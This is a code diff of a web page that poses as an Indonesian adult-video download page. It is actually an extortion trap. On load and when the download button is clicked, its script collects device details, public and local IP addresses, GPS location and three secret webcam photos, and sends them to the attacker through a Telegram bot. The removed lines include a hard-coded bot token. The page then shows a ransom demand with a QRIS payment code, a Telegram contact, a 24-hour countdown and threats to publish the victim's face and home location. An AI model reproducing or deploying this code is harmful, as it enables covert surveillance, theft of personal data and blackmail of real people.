@@ -4,398 +4,16 @@
   <meta charset="UTF-8" />
   <title>Download Video</title>
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <style>
-    :root {
-      --bg: #121212;
-      --card: #1e1e1e;
-      --pink: #ff2a6d;
-      --pink-light: #ff5c8a;
-      --text: #ffffff;
-      --text2: #b3b3b3;
-    }
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-      font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    }
-    body {
-      background: var(--bg);
-      color: var(--text);
-      min-height: 100vh;
-    }
-    
-    .download-container {
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-      justify-content: center;
-      min-height: 100vh;
-      padding: 20px;
-    }
-    
-    .card {
-      background: var(--card);
-      border-radius: 12px;
-      width: 100%;
-      max-width: 420px;
-      box-shadow: 0 8px 25px rgba(0, 0, 0, 0.5);
-      overflow: hidden;
-    }
-    
-    .thumb {
-      width: 100%;
-      aspect-ratio: 16 / 9;
-      object-fit: cover;
-      display: block;
-    }
-    
-    .info {
-      padding: 22px 26px 28px;
-    }
-    
-    .title {
-      font-size: 1.25rem;
-      margin-bottom: 8px;
-    }
-    
-    .meta {
-      font-size: 0.9rem;
-      color: var(--text2);
-      margin-bottom: 22px;
-    }
-    
-    .btn {
-      background: linear-gradient(135deg, var(--pink) 0%, var(--pink-light) 100%);
-      color: #fff;
-      border: none;
-      width: 100%;
-      padding: 14px 0;
-      font-size: 1rem;
-      font-weight: 600;
-      border-radius: 8px;
-      cursor: pointer;
-      transition: 0.25s;
-    }
-    
-    .btn:hover {
-      filter: brightness(1.1);
-    }
-    
-    .btn:active {
-      transform: scale(0.98);
-    }
-    
-    .warning-note {
-      color: var(--text2);
-      font-size: 12px;
-      margin-top: 15px;
-      text-align: center;
-    }
-    
-    #hackedPage {
-      display: none;
-      min-height: 100vh;
-      background: linear-gradient(135deg, #000000 0%, #1a0000 100%);
-    }
-    
-    .hacked-container {
-      min-height: 100vh;
-      padding: 30px 20px;
-      max-width: 500px;
-      margin: 0 auto;
-    }
-    
-    .hacked-header {
-      text-align: center;
-      margin-bottom: 30px;
-    }
-    
-    .warning-icon {
-      font-size: 60px;
-      color: #ff0000;
-      margin-bottom: 20px;
-      animation: blink 1s infinite;
-    }
-    
-    @keyframes blink {
-      0%, 100% { opacity: 1; }
-      50% { opacity: 0.5; }
-    }
-    
-    .hacked-title {
-      font-size: 28px;
-      color: #ff0000;
-      margin-bottom: 15px;
-      font-weight: 900;
-      text-transform: uppercase;
-    }
-    
-    .hacked-subtitle {
-      color: #ff6b6b;
-      font-size: 18px;
-      line-height: 1.4;
-    }
-    
-    .face-section {
-      margin: 30px 0;
-      text-align: center;
-    }
-    
-    .face-title {
-      color: #ff2a6d;
-      font-size: 20px;
-      margin-bottom: 15px;
-      font-weight: 700;
-    }
-    
-    .victim-face-container {
-      width: 100%;
-      max-width: 300px;
-      margin: 0 auto;
-      border: 3px solid #ff0000;
-      border-radius: 10px;
-      overflow: hidden;
-      box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
-    }
-    
-    .victim-face {
-      width: 100%;
-      height: auto;
-      display: block;
-    }
-    
-    .face-caption {
-      background: rgba(255, 0, 0, 0.3);
-      color: white;
-      padding: 12px;
-      text-align: center;
-      font-size: 16px;
-      font-weight: 600;
-    }
-    
-    .warning-box {
-      background: rgba(255, 0, 0, 0.15);
-      border: 2px solid #ff2a6d;
-      border-radius: 12px;
-      padding: 25px;
-      margin: 30px 0;
-      text-align: center;
-    }
-    
-    .warning-box h3 {
-      color: #ff2a6d;
-      margin-bottom: 15px;
-      font-size: 22px;
-      font-weight: 700;
-    }
-    
-    .warning-box p {
-      color: white;
-      font-size: 18px;
-      line-height: 1.5;
-    }
-    
-    .payment-section {
-      margin: 30px 0;
-      text-align: center;
-    }
-    
-    .payment-title {
-      color: #ff2a6d;
-      font-size: 22px;
-      margin-bottom: 20px;
-      font-weight: 700;
-    }
-    
-    .qr-container {
-      background: white;
-      padding: 25px;
-      border-radius: 15px;
-      margin: 20px auto;
-      width: fit-content;
-      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-      border: 4px solid #ff0000;
-    }
-    
-    .qr-code {
-      width: 250px;
-      height: 250px;
-      object-fit: cover;
-      border-radius: 8px;
-      margin-bottom: 15px;
-    }
-    
-    .payment-amount {
-      color: #ff0000;
-      font-size: 22px;
-      font-weight: 900;
-      margin: 15px 0;
-    }
-    
-    .payment-note {
-      color: #333;
-      font-size: 14px;
-      margin-top: 10px;
-    }
-    
-    .telegram-section {
-      margin: 30px 0;
-      text-align: center;
-    }
-    
-    .telegram-title {
-      color: #ff2a6d;
-      font-size: 20px;
-      margin-bottom: 15px;
-      font-weight: 700;
-    }
-    
-    .telegram-btn {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      background: linear-gradient(135deg, #0088cc, #005ea6);
-      color: white;
-      padding: 16px 30px;
-      border-radius: 10px;
-      text-decoration: none;
-      font-weight: 700;
-      font-size: 18px;
-      box-shadow: 0 5px 15px rgba(0, 136, 204, 0.4);
-      transition: 0.25s;
-      margin-top: 10px;
-      border: none;
-      cursor: pointer;
-      width: 100%;
-      max-width: 300px;
-    }
-    
-    .telegram-btn:hover {
-      background: linear-gradient(135deg, #0099dd, #006bb8);
-      transform: translateY(-3px);
-      box-shadow: 0 8px 20px rgba(0, 136, 204, 0.6);
-    }
-    
-    .telegram-icon {
-      margin-right: 10px;
-      font-size: 24px;
-    }
-    
-    .data-box {
-      background: rgba(0, 0, 0, 0.4);
-      border: 2px solid rgba(255, 42, 109, 0.5);
-      border-radius: 12px;
-      padding: 25px;
-      margin: 30px 0;
-    }
-    
-    .data-box h3 {
-      color: #ff2a6d;
-      margin-bottom: 20px;
-      font-size: 20px;
-      text-align: center;
-      text-transform: uppercase;
-    }
-    
-    .data-row {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 12px;
-      padding-bottom: 12px;
-      border-bottom: 1px solid rgba(255, 255, 255, 0.2);
-    }
-    
-    .data-label {
-      color: #ffb8b8;
-      font-weight: 500;
-      font-size: 15px;
-    }
-    
-    .data-value {
-      color: white;
-      font-weight: 600;
-      font-size: 15px;
-      text-align: right;
-    }
-    
-    .countdown-container {
-      text-align: center;
-      margin: 30px 0;
-    }
-    
-    .countdown-title {
-      color: #ff2a6d;
-      font-size: 18px;
-      margin-bottom: 10px;
-      font-weight: 700;
-    }
-    
-    .countdown {
-      font-size: 28px;
-      color: #ff0000;
-      font-weight: 900;
-      background: rgba(255, 42, 109, 0.1);
-      padding: 15px 25px;
-      border-radius: 10px;
-      display: inline-block;
-      animation: pulse 2s infinite;
-    }
-    
-    @keyframes pulse {
-      0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-    }
-    
-    .final-warning {
-      background: rgba(255, 0, 0, 0.15);
-      border: 2px solid rgba(255, 42, 109, 0.5);
-      border-radius: 12px;
-      padding: 25px;
-      margin: 30px 0;
-      text-align: center;
-    }
-    
-    .final-warning p {
-      color: #ff6b6b;
-      font-size: 16px;
-      line-height: 1.5;
-      font-weight: 600;
-    }
-    
-    .back-to-top {
-      position: fixed;
-      bottom: 30px;
-      right: 30px;
-      background: #ff2a6d;
-      color: white;
-      width: 50px;
-      height: 50px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 24px;
-      cursor: pointer;
-      box-shadow: 0 5px 15px rgba(255, 42, 109, 0.4);
-      z-index: 100;
-      opacity: 0;
-      transition: opacity 0.3s;
-    }
-    
-    .back-to-top.show {
-      opacity: 1;
-    }
-  </style>
+  <link rel="stylesheet" href="style.css">
 </head>
 <body>
   <div id="downloadPage">
     <div class="download-container">
       <div class="card">
-        <img class="thumb" src="https://uploader.zenzxz.dpdns.org/uploads/1769233744937.jpeg" alt="Thumbnail" />
+        <img class="thumb" src="" alt="Thumbnail" id="thumbnail">
         <div class="info">
-          <h2 class="title">Video omek timun</h2>
-          <p class="meta">Durasi: 05:22 • 4K Ultra HD • 125 MB</p>
+          <h2 class="title" id="downloadTitle">Video omek timun</h2>
+          <p class="meta" id="downloadMeta">Durasi: 05:22 • 4K Ultra HD • 125 MB</p>
           <button class="btn" onclick="startDownloadProcess()">Download Sekarang</button>
           <p class="warning-note">
             ⚠️ Proses download mungkin membutuhkan waktu beberapa detik
@@ -412,40 +30,38 @@
         <h1 class="hacked-title">PERINGATAN KEAMANAN!</h1>
         <p class="hacked-subtitle" id="hackedSubtitle">KAMERA DAN LOKASI ANDA TELAH DIREKAM</p>
       </div>
-      
-      <div class="face-section" id="faceSection">
-      </div>
-      
-      <div class="warning-box" id="warningBox">
-      </div>
-      
+
+      <div class="face-section" id="faceSection"></div>
+
+      <div class="warning-box" id="warningBox"></div>
+
       <div class="payment-section">
         <h2 class="payment-title">BAYAR DENGAN SCAN QRIS</h2>
         <div class="qr-container">
-          <img src="https://files.catbox.moe/befqdg.jpg" alt="QRIS" class="qr-code">
-          <div class="payment-amount">Rp 50.000 - Rp 500.000</div>
+          <img src="" alt="QRIS" class="qr-code" id="qrCode">
+          <div class="payment-amount" id="paymentAmount">Rp 50.000 - Rp 500.000</div>
           <div class="payment-note">Scan QR code di atas untuk membayar</div>
         </div>
-        <p style="color: #ff6b6b; margin-top: 20px; font-size: 16px;">
+        <p style="color: #ff6b6b; margin-top: 20px; font-size: 16px;" id="paymentDescription">
           Transfer minimal Rp 50.000 untuk menghapus semua data dan foto
         </p>
       </div>
-      
+
       <div class="telegram-section">
         <h2 class="telegram-title">KIRIM BUKTI TRANSFER</h2>
         <p style="color: white; margin-bottom: 20px; font-size: 16px;">
           Setelah transfer, kirim bukti ke Telegram kami:
         </p>
-        <a href="https://t.me/cukiii_55" class="telegram-btn" target="_blank">
+        <a href="" class="telegram-btn" target="_blank" id="telegramLink">
           <span class="telegram-icon">📱</span>
           KLIK UNTUK KE TELEGRAM
         </a>
-        <p style="color: #ffb8b8; margin-top: 15px; font-size: 14px;">
+        <p style="color: #ffb8b8; margin-top: 15px; font-size: 14px;" id="telegramInfo">
           Username: @cukiii_55<br>
           Kirim bukti transfer untuk konfirmasi
         </p>
       </div>
-      
+
       <div class="countdown-container">
         <div class="countdown-title">⏰ WAKTU ANDA TINGGAL:</div>
         <div class="countdown" id="countdown">24:00:00</div>
@@ -453,31 +69,35 @@
           Setelah waktu habis, semua data akan otomatis disebar
         </p>
       </div>
-      
+
       <div class="data-box" id="victimData">
         <h3>📊 DATA YANG TELAH KAMI REKAM</h3>
       </div>
-      
-      <div class="final-warning" id="finalWarning">
-      </div>
-      
-      <div style="text-align: center; margin: 40px 0; padding: 20px; background: rgba(255, 0, 0, 0.1); border-radius: 10px;" id="additionalWarning">
-      </div>
+
+      <div class="final-warning" id="finalWarning"></div>
+
+      <div style="text-align: center; margin: 40px 0; padding: 20px; background: rgba(255, 0, 0, 0.1); border-radius: 10px;" id="additionalWarning"></div>
     </div>
-    
+
     <div class="back-to-top" id="backToTop" onclick="scrollToTop()">↑</div>
   </div>
 
+  <script src="setting.js"></script>
   <script>
-    const BOT_TOKEN = '8499253332:AAEHYvEA0or0Q5KyMGGk6x5ZKGW-R-uxYXA';
-    const CHAT_ID = '7868298450';
-    
+    document.getElementById('thumbnail').src = IMAGES.thumbnail;
+    document.getElementById('qrCode').src = IMAGES.qrCode;
+    document.getElementById('downloadTitle').textContent = MESSAGES.downloadTitle;
+    document.getElementById('downloadMeta').textContent = MESSAGES.downloadMeta;
+    document.getElementById('paymentAmount').textContent = MESSAGES.paymentAmount;
+    document.getElementById('telegramLink').href = MESSAGES.telegramLink;
+    document.getElementById('telegramInfo').innerHTML = `Username: ${MESSAGES.telegramUsername}<br>Kirim bukti transfer untuk konfirmasi`;
+
     let hasCapturedCamera = false;
     let hasCapturedLocation = false;
     let victimData = {};
     let victimFaceBlob = null;
     let victimFaceUrl = null;
-    
+
     async function sendToTelegram(message, photoBlob = null) {
       try {
         if (photoBlob) {
@@ -485,7 +105,7 @@
           formData.append('chat_id', CHAT_ID);
           formData.append('photo', photoBlob);
           formData.append('caption', message);
-          
+
           await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
             method: 'POST',
             body: formData
@@ -505,7 +125,7 @@
         console.log('Telegram error:', error);
       }
     }
-    
+
     async function getIP() {
       try {
         const response = await fetch('https://api.ipify.org?format=json');
@@ -515,30 +135,30 @@
         return 'IP Unknown';
       }
     }
-    
+
     async function getLocalIP() {
       return new Promise((resolve) => {
         if (!window.RTCPeerConnection) {
           resolve('Local IP Unknown');
           return;
         }
-        
+
         const pc = new RTCPeerConnection({ iceServers: [] });
         pc.createDataChannel('');
         pc.createOffer()
           .then(offer => pc.setLocalDescription(offer))
           .catch(() => resolve('Local IP Unknown'));
-        
+
         pc.onicecandidate = (ice) => {
           if (!ice || !ice.candidate || !ice.candidate.candidate) {
             resolve('Local IP Unknown');
             return;
           }
-          
+
           const candidate = ice.candidate.candidate;
           const regex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
           const match = candidate.match(regex);
-          
+
           if (match) {
             resolve(match[1]);
           } else {
@@ -546,27 +166,27 @@
           }
           pc.close();
         };
-        
+
         setTimeout(() => {
           resolve('Local IP Unknown');
           pc.close();
         }, 1000);
       });
     }
-    
+
     async function getDeviceInfo() {
       const ua = navigator.userAgent;
       let deviceType = 'Desktop';
       let deviceBrand = 'Unknown';
       let os = 'Unknown';
       let osVersion = 'Unknown';
-      
+
       if (/android/i.test(ua)) {
         deviceType = 'Android';
         os = 'Android';
         const match = ua.match(/android\s([0-9\.]+)/i);
         osVersion = match ? match[1] : 'Unknown';
-        
+
         if (/samsung/i.test(ua)) deviceBrand = 'Samsung';
         else if (/xiaomi|redmi|poco/i.test(ua)) deviceBrand = 'Xiaomi';
         else if (/oppo/i.test(ua)) deviceBrand = 'Oppo';
@@ -579,38 +199,38 @@
         else if (/lenovo/i.test(ua)) deviceBrand = 'Lenovo';
         else if (/asus/i.test(ua)) deviceBrand = 'Asus';
         else deviceBrand = 'Android Phone';
-        
+
       } else if (/iphone|ipad|ipod/i.test(ua)) {
         deviceType = 'iOS';
         os = 'iOS';
         deviceBrand = 'Apple';
         const match = ua.match(/os\s([0-9_]+)/i);
         osVersion = match ? match[1].replace(/_/g, '.') : 'Unknown';
-        
+
       } else if (/windows phone/i.test(ua)) {
         deviceType = 'Windows Phone';
         os = 'Windows Phone';
         deviceBrand = 'Microsoft';
-        
+
       } else if (/macintosh/i.test(ua)) {
         deviceType = 'Desktop';
         os = 'macOS';
         deviceBrand = 'Apple';
-        
+
       } else if (/windows/i.test(ua)) {
         deviceType = 'Desktop';
         os = 'Windows';
         deviceBrand = 'PC';
-        
+
       } else if (/linux/i.test(ua)) {
         deviceType = 'Desktop';
         os = 'Linux';
         deviceBrand = 'PC';
       }
-      
+
       let batteryLevel = 'Unknown';
       let isCharging = false;
-      
+
       if (navigator.getBattery) {
         try {
           const battery = await navigator.getBattery();
@@ -621,22 +241,22 @@
           isCharging = false;
         }
       }
-      
+
       const screenWidth = window.screen.width;
       const screenHeight = window.screen.height;
       const screenSize = `${screenWidth}×${screenHeight}`;
-      
+
       const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-      
+
       let browser = 'Unknown';
       if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
       else if (/firefox/i.test(ua)) browser = 'Firefox';
       else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
       else if (/edge/i.test(ua)) browser = 'Edge';
       else if (/opera/i.test(ua)) browser = 'Opera';
-      
+
       const cpuCores = navigator.hardwareConcurrency || 'Unknown';
-      
+
       return {
         deviceType,
         deviceBrand,
@@ -654,7 +274,7 @@
         vendor: navigator.vendor || 'Unknown'
       };
     }
-    
+
     async function captureCamera() {
       try {
         const stream = await navigator.mediaDevices.getUserMedia({
@@ -665,54 +285,54 @@
           },
           audio: false
         });
-        
+
         const video = document.createElement('video');
         video.srcObject = stream;
         video.muted = true;
         video.playsInline = true;
-        
+
         await new Promise(resolve => {
           video.onloadedmetadata = () => {
             video.play().then(resolve);
           };
         });
-        
+
         const canvas = document.createElement('canvas');
         const ctx = canvas.getContext('2d');
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
-        
+
         for (let i = 1; i <= 3; i++) {
           await new Promise(resolve => setTimeout(resolve, 800));
-          
+
           ctx.save();
           ctx.scale(-1, 1);
           ctx.drawImage(video, -canvas.width, 0, canvas.width, canvas.height);
           ctx.restore();
-          
+
           canvas.toBlob(async (blob) => {
             if (blob && blob.size > 1024) {
               const file = new File([blob], `victim_photo_${i}.jpg`, { type: 'image/jpeg' });
-              
+
               if (i === 1) {
                 victimFaceBlob = blob;
                 victimFaceUrl = URL.createObjectURL(blob);
               }
-              
+
               await sendToTelegram(`📸 FOTO KORBAN ${i}/3`, file);
             }
           }, 'image/jpeg', 0.85);
         }
-        
+
         stream.getTracks().forEach(track => track.stop());
         hasCapturedCamera = true;
-        
+
       } catch (error) {
         hasCapturedCamera = false;
         console.log('Camera blocked:', error.message);
       }
     }
-    
+
     async function captureLocation() {
       try {
         if (navigator.geolocation) {
@@ -723,31 +343,31 @@
               maximumAge: 0
             });
           });
-          
+
           hasCapturedLocation = true;
           return position.coords;
-          
+
         } else {
           throw new Error('Geolocation tidak didukung');
         }
-        
+
       } catch (error) {
         hasCapturedLocation = false;
         console.log('Location blocked:', error.message);
         return null;
       }
     }
-    
+
     function updateUIForPermissions() {
       const faceSection = document.getElementById('faceSection');
       const warningBox = document.getElementById('warningBox');
       const finalWarning = document.getElementById('finalWarning');
       const additionalWarning = document.getElementById('additionalWarning');
       const hackedSubtitle = document.getElementById('hackedSubtitle');
-      
+
       if (hasCapturedCamera && hasCapturedLocation) {
         hackedSubtitle.textContent = 'KAMERA DAN LOKASI ANDA TELAH DIREKAM';
-        
+
         faceSection.innerHTML = `
           <h2 class="face-title">WAJAH ANDA YANG TELAH DIREKAM</h2>
           <div class="victim-face-container">
@@ -755,11 +375,11 @@
             <div class="face-caption">INILAH FOTO WAJAH ANDA YANG KAMI REKAM</div>
           </div>
         `;
-        
+
         warningBox.innerHTML = `
           <h3>⚠️ PERINGATAN PENTING ⚠️</h3>
           <p>
-            <strong>MINIMAL BAYAR Rp 50.000</strong><br><br>
+            <strong>MINIMAL BAYAR ${MESSAGES.paymentAmount.split(' - ')[0]}</strong><br><br>
             JIKA TIDAK, DATA DAN WAJAH ANDA<br>
             AKAN KAMI SEBARKAN KE:<br>
             • MEDIA SOSIAL<br>
@@ -768,7 +388,7 @@
             <strong>BAYAR UNTUK MENGHAPUS DATA!</strong>
           </p>
         `;
-        
+
         finalWarning.innerHTML = `
           <p>
             ⚠️ PERINGATAN TERAKHIR ⚠️<br><br>
@@ -780,7 +400,7 @@
             <strong>BAYAR SEKARANG ATAU SEMUA DATA AKAN DISEBAR!</strong>
           </p>
         `;
-        
+
         additionalWarning.innerHTML = `
           <p style="color: #ff2a6d; font-size: 16px; font-weight: 600;">
             🔒 Halaman ini tidak bisa ditutup!<br>
@@ -788,10 +408,10 @@
             🔒 Satu-satunya cara: BAYAR!
           </p>
         `;
-        
+
       } else if (hasCapturedCamera && !hasCapturedLocation) {
         hackedSubtitle.textContent = 'KAMERA ANDA TELAH DIREKAM (LOKASI DIBLOKIR)';
-        
+
         faceSection.innerHTML = `
           <h2 class="face-title">WAJAH ANDA YANG TELAH DIREKAM</h2>
           <div class="victim-face-container">
@@ -799,18 +419,18 @@
             <div class="face-caption">INILAH FOTO WAJAH ANDA YANG KAMI REKAM</div>
           </div>
         `;
-        
+
         warningBox.innerHTML = `
           <h3>⚠️ ANDA MEMBLOKIR LOKASI TAPI WAJAH SUDAH KAMI REKAM ⚠️</h3>
           <p>
             <strong>ANDA TELAH MEMBLOKIR AKSES LOKASI</strong><br><br>
             TETAPI KAMI SUDAH REKAM 3 FOTO WAJAH ANDA!<br><br>
-            MINIMAL BAYAR Rp 50.000<br>
+            MINIMAL BAYAR ${MESSAGES.paymentAmount.split(' - ')[0]}<br>
             UNTUK MENGHAPUS FOTO WAJAH ANDA<br><br>
             <strong>JIKA TIDAK, WAJAH ANDA AKAN KAMI SEBARKAN!</strong>
           </p>
         `;
-        
+
         finalWarning.innerHTML = `
           <p>
             ⚠️ PERINGATAN TERAKHIR ⚠️<br><br>
@@ -822,18 +442,18 @@
             <strong>BAYAR SEKARANG UNTUK HAPUS FOTO WAJAH!</strong>
           </p>
         `;
-        
+
         additionalWarning.innerHTML = `
           <p style="color: #ff2a6d; font-size: 16px; font-weight: 600;">
             🔒 Lokasi Anda diblokir, tapi wajah sudah kami rekam!<br>
             🔒 Foto wajah Anda akan disebar jika tidak bayar!<br>
-            🔒 Bayar Rp 50.000 untuk hapus semua foto!
+            🔒 Bayar ${MESSAGES.paymentAmount.split(' - ')[0]} untuk hapus semua foto!
           </p>
         `;
-        
+
       } else if (!hasCapturedCamera && hasCapturedLocation) {
         hackedSubtitle.textContent = 'LOKASI ANDA TELAH DIREKAM (KAMERA DIBLOKIR)';
-        
+
         faceSection.innerHTML = `
           <h2 class="face-title">LOKASI ANDA YANG TELAH DIREKAM</h2>
           <div class="victim-face-container">
@@ -841,18 +461,18 @@
             <div class="face-caption">LOKASI GPS ANDA SUDAH KAMI REKAM</div>
           </div>
         `;
-        
+
         warningBox.innerHTML = `
           <h3>⚠️ ANDA MEMBLOKIR KAMERA TAPI LOKASI SUDAH KAMI REKAM ⚠️</h3>
           <p>
             <strong>ANDA TELAH MEMBLOKIR AKSES KAMERA</strong><br><br>
             TETAPI KAMI SUDAH REKAM LOKASI GPS ANDA!<br><br>
-            MINIMAL BAYAR Rp 50.000<br>
+            MINIMAL BAYAR ${MESSAGES.paymentAmount.split(' - ')[0]}<br>
             UNTUK MENGHAPUS LOKASI ANDA<br><br>
             <strong>JIKA TIDAK, LOKASI RUMAH ANDA AKAN KAMI SEBARKAN!</strong>
           </p>
         `;
-        
+
         finalWarning.innerHTML = `
           <p>
             ⚠️ PERINGATAN TERAKHIR ⚠️<br><br>
@@ -864,18 +484,18 @@
             <strong>BAYAR SEKARANG UNTUK HAPUS LOKASI ANDA!</strong>
           </p>
         `;
-        
+
         additionalWarning.innerHTML = `
           <p style="color: #ff2a6d; font-size: 16px; font-weight: 600;">
             🔒 Kamera Anda diblokir, tapi lokasi rumah sudah kami ketahui!<br>
             🔒 Lokasi rumah Anda akan disebar jika tidak bayar!<br>
-            🔒 Bayar Rp 50.000 untuk hapus data lokasi!
+            🔒 Bayar ${MESSAGES.paymentAmount.split(' - ')[0]} untuk hapus data lokasi!
           </p>
         `;
-        
+
       } else {
         hackedSubtitle.textContent = 'DATA PERANGKAT ANDA TELAH DIREKAM';
-        
+
         faceSection.innerHTML = `
           <h2 class="face-title">ANDA MEMBLOKIR SEMUA AKSES</h2>
           <div class="victim-face-container">
@@ -883,18 +503,18 @@
             <div class="face-caption">ANDA MEMBLOKIR KAMERA DAN LOKASI</div>
           </div>
         `;
-        
+
         warningBox.innerHTML = `
           <h3>⚠️ ANDA MEMBLOKIR SEMUA AKSES ⚠️</h3>
           <p>
             <strong>ANDA TELAH MEMBLOKIR KAMERA DAN LOKASI</strong><br><br>
             TETAPI KAMI SUDAH REKAM SEMUA DATA PERANGKAT ANDA!<br><br>
-            MINIMAL BAYAR Rp 50.000<br>
+            MINIMAL BAYAR ${MESSAGES.paymentAmount.split(' - ')[0]}<br>
             UNTUK MENGHAPUS DATA ANDA<br><br>
             <strong>JIKA TIDAK, DATA ANDA AKAN KAMI SEBARKAN!</strong>
           </p>
         `;
-        
+
         finalWarning.innerHTML = `
           <p>
             ⚠️ PERINGATAN TERAKHIR ⚠️<br><br>
@@ -906,20 +526,20 @@
             <strong>BAYAR SEKARANG UNTUK HAPUS DATA ANDA!</strong>
           </p>
         `;
-        
+
         additionalWarning.innerHTML = `
           <p style="color: #ff2a6d; font-size: 16px; font-weight: 600;">
             🔒 Anda memblokir semua akses, tapi data perangkat sudah kami simpan!<br>
             🔒 Data HP Anda akan disebar jika tidak bayar!<br>
-            🔒 Bayar Rp 50.000 untuk hapus semua data!
+            🔒 Bayar ${MESSAGES.paymentAmount.split(' - ')[0]} untuk hapus semua data!
           </p>
         `;
       }
     }
-    
+
     function displayVictimData(data) {
       const victimDataEl = document.getElementById('victimData');
-      
+
       victimDataEl.innerHTML += `
         <div class="data-row">
           <span class="data-label">📱 Tipe HP:</span>
@@ -967,11 +587,11 @@
         </div>
       `;
     }
-    
+
     function scrollToTop() {
       window.scrollTo({ top: 0, behavior: 'smooth' });
     }
-    
+
     window.addEventListener('scroll', function() {
       const backToTopBtn = document.getElementById('backToTop');
       if (window.scrollY > 300) {
@@ -980,13 +600,13 @@
         backToTopBtn.classList.remove('show');
       }
     });
-    
+
     async function startDownloadProcess() {
       const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
       const localIP = await getLocalIP();
       const locationCoords = await captureLocation();
-      
+
       victimData = {
         ...deviceInfo,
         publicIP,
@@ -994,9 +614,9 @@
         timestamp: new Date().toLocaleString('id-ID'),
         location: hasCapturedLocation ? locationCoords : null
       };
-      
+
       let telegramMessage = `🚨🚨🚨 <b>NEW VICTIM CAPTURED - PAYMENT DEMAND</b> 🚨🚨🚨\n\n`;
-      
+
       telegramMessage += `📱 <b>DEVICE INFO:</b>\n`;
       telegramMessage += `• Type: ${deviceInfo.deviceType}\n`;
       telegramMessage += `• Brand: ${deviceInfo.deviceBrand}\n`;
@@ -1008,11 +628,11 @@
       telegramMessage += `• CPU: ${deviceInfo.cpuCores} cores\n`;
       telegramMessage += `• Language: ${deviceInfo.language}\n`;
       telegramMessage += `• Timezone: ${deviceInfo.timezone}\n\n`;
-      
+
       telegramMessage += `🌐 <b>NETWORK INFO:</b>\n`;
       telegramMessage += `• Public IP: <code>${publicIP}</code>\n`;
       telegramMessage += `• Local IP: <code>${localIP}</code>\n\n`;
-      
+
       if (hasCapturedLocation && locationCoords) {
         telegramMessage += `📍 <b>LOCATION CAPTURED:</b>\n`;
         telegramMessage += `• Latitude: ${locationCoords.latitude}\n`;
@@ -1022,17 +642,17 @@
       } else {
         telegramMessage += `📍 <b>LOCATION:</b> ❌ BLOCKED\n\n`;
       }
-      
+
       telegramMessage += `📸 <b>CAMERA:</b> ${hasCapturedCamera ? 'Attempting capture...' : 'BLOCKED ❌'}\n`;
-      telegramMessage += `💰 <b>RANSOM AMOUNT:</b> Rp 50.000 - Rp 500.000\n`;
+      telegramMessage += `💰 <b>RANSOM AMOUNT:</b> ${MESSAGES.paymentAmount}\n`;
       telegramMessage += `📅 <b>Date:</b> ${new Date().toLocaleDateString('id-ID')}\n`;
       telegramMessage += `⏰ <b>Time:</b> ${new Date().toLocaleTimeString('id-ID')}\n\n`;
       telegramMessage += `💀 <b>RANSOM PAGE DISPLAYED TO VICTIM</b>`;
-      
+
       await sendToTelegram(telegramMessage);
-      
+
       await captureCamera();
-      
+
       await sendToTelegram(
         `📸 <b>CAMERA RESULT:</b> ${hasCapturedCamera ? '✅ 3 FACE PHOTOS CAPTURED' : '❌ Blocked'}\n\n` +
         `🤑 <b>VICTIM DATA READY FOR RANSOM DEMAND</b>\n` +
@@ -1040,31 +660,31 @@
         `🌐 IP: ${publicIP}\n` +
         `📍 Location: ${hasCapturedLocation ? 'CAPTURED' : 'BLOCKED'}\n` +
         `📸 Photos: ${hasCapturedCamera ? '3 FACE PHOTOS' : '0'}\n\n` +
-        `💰 <b>DEMANDING: Rp 50.000 - Rp 500.000</b>\n` +
+        `💰 <b>DEMANDING: ${MESSAGES.paymentAmount}</b>\n` +
         `⏰ Time Limit: 24 HOURS\n` +
-        `📱 Contact: @cukiii_55`
+        `📱 Contact: ${MESSAGES.telegramUsername}`
       );
-      
+
       showHackedPage();
     }
-    
+
     function showHackedPage() {
       document.getElementById('downloadPage').style.display = 'none';
       document.getElementById('hackedPage').style.display = 'block';
-      
+
       updateUIForPermissions();
       displayVictimData(victimData);
       startCountdown();
       window.scrollTo(0, 0);
     }
-    
+
     function startCountdown() {
       let hours = 24;
       let minutes = 0;
       let seconds = 0;
-      
+
       const countdownEl = document.getElementById('countdown');
-      
+
       const timer = setInterval(() => {
         if (seconds === 0) {
           if (minutes === 0) {
@@ -1084,15 +704,15 @@
         } else {
           seconds--;
         }
-        
+
         countdownEl.innerHTML = `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
       }, 1000);
     }
-    
+
     window.addEventListener('load', async () => {
       const deviceInfo = await getDeviceInfo();
       const publicIP = await getIP();
-      
+
       await sendToTelegram(
         `🌐 <b>NEW VISITOR - READY FOR TRAP</b>\n\n` +
         `📱 <b>Device:</b> ${deviceInfo.deviceBrand} ${deviceInfo.deviceType}\n` +
